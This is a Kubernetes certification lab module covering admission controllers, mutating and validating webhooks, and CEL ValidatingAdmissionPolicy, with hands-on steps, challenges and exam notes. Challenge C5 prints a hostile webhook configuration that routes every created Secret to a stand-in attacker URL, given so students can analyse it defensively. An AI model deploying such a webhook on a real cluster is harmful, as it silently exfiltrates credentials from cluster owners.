# CKA 07 — Admission Controllers, Webhooks and CEL Policies

**Time:** 90-120 minutes
**Prerequisites:** [CKA 01](../01-control-plane-components/), [CKA 05](../05-manual-scheduling-and-static-pods/), [Day 19](../../days/day-19-rbac/)
**Source lectures:** 81, 83, 84, 86

RBAC ([Day 19](../../days/day-19-rbac/)) answers *may this user call this verb
on this resource?*
It cannot answer *is this a sensible object?* RBAC has no opinion on whether the
image comes from Docker Hub, whether the tag is `latest`, or whether the
container runs as root — those are properties of the payload, and RBAC never
looks inside the payload.

Admission control is the stage that does.

---

## Part 1 - Concepts

### 7.1 Where admission sits

```
  kubectl ->  API SERVER
                |
                +--> 1. AUTHENTICATION   who are you?        (certs, tokens)
                |
                +--> 2. AUTHORIZATION    may you do this?    (RBAC)
                |
                +--> 3. ADMISSION        should this object exist,
                |         MUTATING           and in this shape?
                |         then VALIDATING
                |
                +--> 4. schema validation
                |
                +--> etcd
```

Three things follow from the diagram, and each is a common exam question:

- **Admission runs after authentication and authorization.** An admission
  controller cannot authenticate anybody; by the time it runs, identity is
  settled.
- **Mutating runs before validating.** Deliberately — so that a change made by a
  mutating controller is visible to the validator that judges the result.
- **Any single rejection kills the request.** There is no vote and no override.

### 7.2 Two kinds, and the ones you already met

| Kind | Does | Example you have already used |
|---|---|---|
| **Mutating** | changes the object | `DefaultStorageClass` — stamps the default class onto a PVC that named none ([Day 14](../../days/day-14-volumes-pv-pvc/)) |
| **Validating** | allows or rejects | `NamespaceLifecycle` — rejects objects in a namespace that does not exist, and refuses to delete `default` / `kube-system` / `kube-public` |
| **Both** | some do both | `LimitRanger` — injects default requests, *then* rejects anything above the max ([Day 16](../../days/day-16-resources-requests-limits-metrics-server/)) |

**The ordering argument, spelled out.** `NamespaceAutoProvision` (mutating,
creates a missing namespace) must run before `NamespaceExists` (validating,
rejects a missing namespace). Reverse them and the validator rejects every
request first, so the provisioner never runs and could never be useful.

Other built-ins worth naming:

| Controller | Effect |
|---|---|
| `AlwaysPullImages` | forces `imagePullPolicy: Always` — stops a pod reusing a cached image it has no credentials to pull |
| `NodeRestriction` | limits what a **kubelet** may modify — its own Node and only pods bound to it |
| `EventRateLimit` | caps event volume so one hot loop cannot flood the API server |
| `ServiceAccount` | injects the default ServiceAccount and its token mount ([Day 19](../../days/day-19-rbac/)) |
| `DefaultStorageClass` | as above |
| `ResourceQuota` | enforces the namespace quota ([Day 03](../../days/day-03-namespaces/)) |

> **Deprecation to remember:** `NamespaceExists` and `NamespaceAutoProvision`
> are deprecated; `NamespaceLifecycle` replaces them and is on by default.

### 7.3 Turning them on and off

They are **compiled into the API server** — flags, not objects:

```
--enable-admission-plugins=NodeRestriction,NamespaceAutoProvision
--disable-admission-plugins=DefaultStorageClass
```

`--enable-admission-plugins` adds *to* the default set; it does not replace it.

Two ways to find what is running, and you need both:

```bash
# what this API server is CONFIGURED with -- only the non-default additions
docker exec devops-control-plane grep -E "enable-admission|disable-admission" \
  /etc/kubernetes/manifests/kube-apiserver.yaml

# what the DEFAULT set is -- from the binary's own help, not from any file
docker exec devops-control-plane kube-apiserver -h | grep -A4 "enable-admission-plugins"
```

**The distinction matters.** The manifest shows only what someone added. The
`-h` output shows the built-in defaults that are on whether anyone asked or not.
A question like "which of these is *not* enabled by default?" is answered by the
second command, never the first.

On a kubeadm cluster the API server is a **static pod** (CKA 05), so editing
`/etc/kubernetes/manifests/kube-apiserver.yaml` restarts it within seconds — and
a typo takes the whole API away with it.

### 7.4 When built-ins are not enough: admission webhooks

Built-in controllers ship with Kubernetes. To enforce *your* rules — "no images
from Docker Hub", "every pod carries an `owner` label" — you need code, and that
code runs **outside** the API server.

Two special built-in controllers exist to call it:

- **`MutatingAdmissionWebhook`**
- **`ValidatingAdmissionWebhook`**

Both are enabled by default. They do nothing until you create a configuration
object telling them where to call.

```
API server  --(AdmissionReview JSON, over HTTPS)-->  your webhook server
            <--(AdmissionReview with allowed: true/false [+ patch])--
```

**The wire format.** The API server POSTs an `AdmissionReview` containing the
user, the operation, the resource and the full object. Your server replies with
an `AdmissionReview` whose `response` carries:

```json
{ "uid": "<echo the request uid>",
  "allowed": true,
  "patchType": "JSONPatch",
  "patch": "<base64 of a JSON Patch array>" }
```

- **`uid` must be echoed back.** Omit it and the API server rejects the reply.
- **`patch` is base64-encoded**, and only meaningful on a *mutating* webhook.
- To reject with a message, set `allowed: false` and fill `status.message` —
  that string is what the user sees on their terminal.

A **JSON Patch** is a list of operations, each `add` / `remove` / `replace` /
`move` / `copy` / `test`, with a `path` into the object:

```json
[ {"op": "add", "path": "/metadata/labels/owner", "value": "platform"} ]
```

> The exam will not ask you to write a webhook server. It will ask you to
> *configure* one, read one, or work out why one is breaking the cluster.

### 7.5 The configuration object

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration      # or MutatingWebhookConfiguration
metadata:
  name: pod-policy.example.com
webhooks:
  - name: pod-policy.example.com          # must be a qualified domain name
    clientConfig:
      service:                            # server runs INSIDE the cluster
        name: webhook-service
        namespace: webhook-demo
        path: /validate
        port: 443
      caBundle: <base64 CA cert>
      # url: "https://outside.example.com/validate"   # ...or OUTSIDE it
    rules:
      - operations: ["CREATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
        scope: "Namespaced"
    admissionReviewVersions: ["v1"]       # required
    sideEffects: None                     # required
    failurePolicy: Fail                   # or Ignore
    namespaceSelector: {}                 # narrow the blast radius
```

Every field earns its place:

| Field | Why it matters |
|---|---|
| `clientConfig.service` **or** `url` | in-cluster Service, or an external endpoint. Not both. |
| `caBundle` | **the API server verifies the webhook's TLS certificate.** Plain HTTP is not an option. |
| `rules` | exactly which operations and resources trigger the call. Everything else skips it. |
| `admissionReviewVersions` | required in `v1`; omit it and creation is rejected |
| `sideEffects` | required. `None` means a dry-run request is safe to send |
| `failurePolicy` | **`Fail`** (default) = webhook unreachable means request rejected. **`Ignore`** = request proceeds |
| `namespaceSelector` / `objectSelector` | limits which namespaces/objects are subject to the hook |

> **`failurePolicy: Fail` plus a rule matching everything is how people brick
> clusters.** If your webhook pod is down and the hook matches `pods` in all
> namespaces, nothing can be created — **including the webhook pod itself**. It
> cannot restart, so it stays down. Always exclude `kube-system` and the
> webhook's own namespace with a `namespaceSelector`. This is the single most
> important operational fact in this assignment.

### 7.6 ValidatingAdmissionPolicy — validation without a server

Since **1.30 (GA)** you can express validation rules in **CEL**, evaluated
inside the API server. No server, no TLS, no `failurePolicy` cliff.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata: {name: no-latest-tag}
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        operations: ["CREATE", "UPDATE"]
        resources: ["pods"]
  validations:
    - expression: "object.spec.containers.all(c, !c.image.endsWith(':latest'))"
      message: "the :latest tag is not permitted"
```

A **policy** defines the rule; a separate **`ValidatingAdmissionPolicyBinding`**
says where it applies. That split is the point — one policy, many bindings, each
scoped to different namespaces and each choosing its own action (`Deny`,
`Warn`, or `Audit`).

**When to use which:**

| | Webhook | ValidatingAdmissionPolicy |
|---|---|---|
| Can mutate | **yes** | no (validation only) |
| Needs a server + TLS | yes | **no** |
| Can call external systems | **yes** | no |
| Can take the cluster down | **yes** | no |
| Arbitrary logic | **yes** | CEL expressions only |

If the rule is a property of the object itself, prefer a policy. Reach for a
webhook when you must mutate, or when the decision needs information the object
does not contain.

---

## Part 2 - Hands-on lab

> **This assignment edits the API server's static pod manifest.** If you get it
> wrong the cluster stops answering. That is survivable — see
> **Recovery** at the end of Part 2 — and doing it once here is far better than
> doing it first in an exam.

```bash
CP=devops-control-plane          # your kind control-plane container
docker exec $CP cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/apiserver.backup.yaml
```

**Take that backup.** Every step below assumes it exists.

### Step 1: What is enabled, and what is default

```bash
# (a) what someone CONFIGURED on this cluster
docker exec $CP grep -E "enable-admission|disable-admission" \
  /etc/kubernetes/manifests/kube-apiserver.yaml
```

```
    - --enable-admission-plugins=NodeRestriction
```

kind, like kubeadm, adds exactly one. Everything else running is a default.

```bash
# (b) what the BINARY considers default -- the authoritative list
docker exec $CP kube-apiserver -h | grep -A6 "enable-admission-plugins"
```

Read the sentence carefully: *"...that should be enabled in addition to default
enabled ones"*, followed by the default list. Confirm for yourself that
`NamespaceLifecycle`, `MutatingAdmissionWebhook` and `ValidatingAdmissionWebhook`
are in it, and that **`NamespaceAutoProvision` is not**.

### Step 2: See a validating controller reject something

```bash
kubectl run nginx --image=nginx:alpine -n blue
```

```
Error from server (NotFound): namespaces "blue" not found
```

**Nothing was wrong with your pod.** `NamespaceLifecycle` looked at the target
namespace and refused. Note the failure came *after* authentication and
authorization succeeded — you had every permission needed.

### Step 3: Enable NamespaceAutoProvision

```bash
bash solution/toggle-plugin.sh add-enable NamespaceAutoProvision
```

The script copies the manifest out, edits it, copies it back, and waits for the
API server to come back. Watch what happens underneath:

```bash
docker exec $CP grep enable-admission /etc/kubernetes/manifests/kube-apiserver.yaml
kubectl get pod -n kube-system kube-apiserver-$CP -o jsonpath='{.status.containerStatuses[0].restartCount}{"\n"}'
```

Now retry the pod that just failed:

```bash
kubectl run nginx --image=nginx:alpine -n blue
kubectl get ns blue
kubectl get pod -n blue
```

The namespace **now exists**, created by the admission controller as a side
effect of the pod request. That is a mutating controller acting on the cluster,
not just on the object.

Put it back:

```bash
bash solution/toggle-plugin.sh del-enable NamespaceAutoProvision
kubectl delete ns blue --ignore-not-found
```

### Step 4: Disable a default controller

```bash
kubectl get storageclass
kubectl apply -f solution/01-pvc-no-class.yaml
kubectl get pvc demo-pvc -n default -o jsonpath='{.spec.storageClassName}{"\n"}'
```

`standard` — you never wrote that. `DefaultStorageClass` injected it. Now
remove the controller and try again:

```bash
kubectl delete pvc demo-pvc --ignore-not-found
bash solution/toggle-plugin.sh add-disable DefaultStorageClass

kubectl apply -f solution/01-pvc-no-class.yaml
kubectl get pvc demo-pvc -o jsonpath='{.spec.storageClassName}{"\n"}'   # empty
kubectl get pvc demo-pvc
```

`Pending`, forever — no class, so no provisioner claims it. Restore:

```bash
kubectl delete pvc demo-pvc --ignore-not-found
bash solution/toggle-plugin.sh del-disable DefaultStorageClass
```

Confirm the flag is gone before continuing:

```bash
docker exec $CP grep -c "disable-admission" /etc/kubernetes/manifests/kube-apiserver.yaml   # 0
```

### Recovery, if the API server does not come back

```bash
docker exec $CP crictl ps -a | grep apiserver          # is the container even trying?
docker exec $CP crictl logs $(docker exec $CP crictl ps -a --name kube-apiserver -q | head -1)
docker exec $CP cp /root/apiserver.backup.yaml /etc/kubernetes/manifests/kube-apiserver.yaml
```

`kubectl` is dead while the API server is, so **`crictl` on the node is your
only window** — the same lesson as CKA 02. Restoring the backup is always the
fastest fix; diagnose afterwards.

### Step 5: Deploy a real admission webhook

Everything for this is in `solution/webhook/`. One script does the whole
sequence — read it before you run it, because every line is a step you could be
asked to perform by hand:

```bash
cat solution/webhook/deploy-webhook.sh
bash solution/webhook/deploy-webhook.sh
```

It performs five things:

1. creates a **CA** and a **server certificate** whose SAN is
   `webhook-service.webhook-demo.svc`
2. stores the server cert as a `kubernetes.io/tls` Secret
3. loads `server.py` into a ConfigMap — the server is stock `python:3.12-alpine`
   with no image to build
4. applies the Deployment and Service
5. applies the webhook configurations with the **CA bundle** substituted in

Watch it think, in a second terminal:

```bash
kubectl logs -n webhook-demo -l app=webhook-server -f
```

### Step 6: Three pods, three outcomes

```bash
kubectl create namespace cka07
```

**(a) No securityContext — the mutating webhook fills it in:**

```bash
kubectl apply -f solution/04-pod-with-defaults.yaml
kubectl get pod pod-with-defaults -n cka07 -o jsonpath='{.spec.securityContext}{"\n"}'
```

```json
{"runAsNonRoot":true,"runAsUser":1234}
```

**You did not write that.** Compare against the file you applied — the stored
object differs from what you submitted. That is mutation, and it is the same
mechanism `DefaultStorageClass` used in Step 4.

```bash
kubectl exec -n cka07 pod-with-defaults -- id
```

```
uid=1234 gid=0(root) groups=0(root)
```

**(b) Explicit opt-out — the webhook leaves it alone:**

```bash
kubectl apply -f solution/05-pod-with-override.yaml
kubectl get pod pod-with-override -n cka07 -o jsonpath='{.spec.securityContext}{"\n"}'
kubectl exec -n cka07 pod-with-override -- id       # uid=0(root)
```

`runAsNonRoot: false` was already set, so the mutator added nothing. A good
mutating webhook **never overrides an explicit decision** — it only fills gaps.

**(c) A contradiction — the validating webhook rejects it:**

```bash
kubectl apply -f solution/06-pod-with-conflict-BAD.yaml
```

```
Error from server: error when creating "...": admission webhook
"pod-policy-validate.example.com" denied the request: securityContext conflict:
runAsNonRoot is true but runAsUser is 0 (root)...
```

```bash
kubectl get pod pod-with-conflict -n cka07      # NotFound
```

**Nothing was created.** The message on your terminal is the exact string
`server.py` put in `status.message` — trace it in the source and see.

Now read the server's own log:

```bash
kubectl logs -n webhook-demo -l app=webhook-server --tail=20
```

```
MUTATE   pod=pod-with-defaults  user=kubernetes-admin ops=1
VALIDATE pod=pod-with-defaults  user=kubernetes-admin allowed=True
MUTATE   pod=pod-with-conflict  user=kubernetes-admin ops=0
VALIDATE pod=pod-with-conflict  user=kubernetes-admin allowed=False securityContext conflict...
```

**MUTATE always precedes VALIDATE for the same pod.** There is the ordering from
7.1, in your own logs.

### Step 7: Break the webhook and watch the cluster refuse work

This is the failure mode that matters operationally.

```bash
kubectl scale deployment webhook-server -n webhook-demo --replicas=0
kubectl wait --for=delete pod -l app=webhook-server -n webhook-demo --timeout=60s

kubectl run canary --image=nginx:alpine -n cka07
```

```
Error from server (InternalError): failed calling webhook
"pod-policy-validate.example.com": ... connect: connection refused
```

**No pods can be created in `cka07` at all** — the validating hook has
`failurePolicy: Fail` and it is unreachable. Now prove the guard works:

```bash
kubectl run canary --image=nginx:alpine -n kube-system
kubectl get pod canary -n kube-system
kubectl delete pod canary -n kube-system
```

That succeeds, because the `namespaceSelector` excludes `kube-system`. **This is
the only reason the cluster is still recoverable.** Without it, the webhook's own
pod could not be scheduled — and it is the thing that needs to come back.

```bash
kubectl scale deployment webhook-server -n webhook-demo --replicas=1
kubectl rollout status deployment/webhook-server -n webhook-demo
kubectl run canary --image=nginx:alpine -n cka07 && kubectl delete pod canary -n cka07
```

> **Emergency procedure, worth memorising.** If a webhook is wedging the cluster
> and you cannot bring the server back:
> ```bash
> kubectl delete validatingwebhookconfiguration <name>
> kubectl delete mutatingwebhookconfiguration <name>
> ```
> Deleting the *configuration* removes the call. The API server stops dialling
> immediately. Recreate it once the server is healthy.

### Step 8: The same job with no server at all

```bash
kubectl apply -f solution/07-validating-admission-policy.yaml
kubectl get validatingadmissionpolicy
kubectl get validatingadmissionpolicybinding
```

The bindings select namespaces by **label**, so nothing is enforced until you
label one:

```bash
kubectl create namespace enforced && kubectl label ns enforced policy=enforce
kubectl create namespace warned   && kubectl label ns warned   policy=warn
```

**Deny:**

```bash
kubectl apply -f solution/08-policy-test-pods.yaml -n enforced
```

```
pod/good-pod created
Error ... ValidatingAdmissionPolicy 'pod-image-and-label-policy' with binding
'pod-image-and-label-policy-enforce' denied request: the :latest tag is not
permitted -- pin an explicit version
Error ... every pod must carry an 'owner' label
```

One pod created, two rejected — with the exact `message` from the policy.

**Warn:**

```bash
kubectl apply -f solution/08-policy-test-pods.yaml -n warned
```

```
Warning: Validation failed for ValidatingAdmissionPolicy ...: the :latest tag is not permitted
pod/latest-tag-pod created
```

**Same policy, same violations, different binding — created anyway, with a
warning on stderr.** This is how you introduce a rule to a live cluster: bind it
`Warn` first, read the warnings for a week, then flip to `Deny`.

```bash
kubectl get pods -n warned
kubectl get pods -n enforced
```

Note what this cost you: no certificate, no Deployment, no Service, no CA
bundle, and no way to take the cluster down.

### Cleanup

```bash
kubectl delete -f solution/07-validating-admission-policy.yaml --ignore-not-found
kubectl delete ns enforced warned cka07 --ignore-not-found
kubectl delete validatingwebhookconfiguration pod-policy-validate.example.com --ignore-not-found
kubectl delete mutatingwebhookconfiguration  pod-policy-mutate.example.com  --ignore-not-found
kubectl delete ns webhook-demo --ignore-not-found
kubectl delete pvc demo-pvc --ignore-not-found
docker exec devops-control-plane grep -E "enable-admission|disable-admission" \
  /etc/kubernetes/manifests/kube-apiserver.yaml
```

That last line should print only `--enable-admission-plugins=NodeRestriction`.
**Delete the webhook configurations before the namespace**, or the hook will
still be dialling a Service that is being torn down.

---

## Part 3 - Challenges

### C1 - Enforce a registry

Write a rule — using **ValidatingAdmissionPolicy**, not a webhook — that permits
images only from `registry.internal.example.com` or `registry.k8s.io`, and
rejects everything else. Include `initContainers`. State why a
`ValidatingAdmissionPolicy` is the right tool here and what you would need a
webhook for instead.

### C2 - Why is my pod different from my file?

A colleague applies a Deployment, then `kubectl get`s it and finds a
`securityContext` and an `imagePullPolicy` they never wrote. Give the exact
commands to determine **which** admission plugin or webhook made each change.
(Hint: three sources — the enabled plugin list, the webhook configurations, and
the object's own annotations.)

### C3 - The unrecoverable cluster

Describe, precisely, the sequence in which a `ValidatingWebhookConfiguration`
can make a cluster permanently unable to create pods, including the reason the
obvious fix (restart the webhook pod) does not work. Then give the two-command
escape.

### C4 - Order of operations

You have a mutating webhook that adds `runAsUser: 1234` and a validating webhook
that rejects `runAsUser < 1000`. A pod is submitted with no securityContext.
Does it succeed? Now swap the two — make the *validating* one run first. Can
you? Explain what controls the ordering and what does not.

### C5 - Read a hostile configuration

```yaml
webhooks:
  - name: audit.example.com
    clientConfig:
      url: "https://collector.attacker.example/ingest"
    rules:
      - operations: ["CREATE"]
        apiGroups: ["*"]
        apiVersions: ["*"]
        resources: ["secrets"]
    failurePolicy: Ignore
    sideEffects: None
```

Someone with `create` on `validatingwebhookconfigurations` applied this. What
does it achieve, why is `failurePolicy: Ignore` the *dangerous* choice here
rather than the safe one, and which RBAC rule should have prevented it?

---

## Part 4 - Verify

```bash
bash solution/verify.sh
```

Checks: the default plugin list is readable; the API server manifest is back to
its original flags; the webhook Deployment is Ready with a valid SAN; mutation
injected a securityContext; the conflicting pod was rejected; the policy denies
in one namespace and warns in another.

---

## Part 5 - Exam notes

**Fast paths**

```bash
# the DEFAULT plugin list (not the configured one)
kube-apiserver -h | grep -A6 enable-admission-plugins
# ...on kubeadm, where the API server is a pod:
kubectl -n kube-system exec kube-apiserver-controlplane -- kube-apiserver -h \
  | grep -A6 enable-admission-plugins

# what is CONFIGURED here
grep -E "enable-admission|disable-admission" /etc/kubernetes/manifests/kube-apiserver.yaml

# every webhook in the cluster, and what it intercepts
kubectl get validatingwebhookconfiguration,mutatingwebhookconfiguration
kubectl get validatingwebhookconfiguration X -o jsonpath='{.webhooks[*].rules}' | jq

# emergency: stop a webhook wedging the cluster
kubectl delete validatingwebhookconfiguration X

# policies
kubectl get validatingadmissionpolicy,validatingadmissionpolicybinding
kubectl explain validatingadmissionpolicy.spec.validations
```

**Traps**

- **Admission is after authn and authz.** "Authenticate users" is never a
  function of an admission controller — a stock exam question.
- **Mutating runs before validating.** Always, and you cannot change it.
- **`--enable-admission-plugins` adds to the defaults**; it does not define the
  whole set. Reading only the manifest tells you what someone *added*.
- **The manifest is a static pod.** Save a copy first. A typo takes the API
  server away, and then only `crictl` can tell you why.
- **`NamespaceExists` / `NamespaceAutoProvision` are deprecated**, replaced by
  `NamespaceLifecycle`.
- **Webhook configuration objects are cluster-scoped.** `-n` does nothing.
- **`admissionReviewVersions` and `sideEffects` are required** in
  `admissionregistration.k8s.io/v1`. Omitting either fails validation.
- **`caBundle` is mandatory** for a self-signed server cert, and the cert needs
  a **SAN** matching `<svc>.<ns>.svc` — a bare CN is rejected.
- **`failurePolicy: Fail` + broad `rules` + no `namespaceSelector` = an
  unrecoverable cluster.** Delete the *configuration* to escape.
- **The webhook Service port is 443 by default**, whatever the container listens
  on. Bridge it in the Service or set `clientConfig.service.port`.
- **A mutating webhook must not fight explicit user intent** — fill gaps only.
- **`ValidatingAdmissionPolicy` cannot mutate.** If the task says "default a
  value", you need a mutating webhook (or `MutatingAdmissionPolicy`, alpha).
- Short names: `vwc`, `mwc`; there is no short name for the policy kinds.

---

**Previous:** [CKA 06 — Priority Classes, Multiple Schedulers and Scheduler Profiles](../06-priority-schedulers-profiles/)
**Next:** [CKA 08 — Commands and Arguments](../08-commands-and-arguments/)
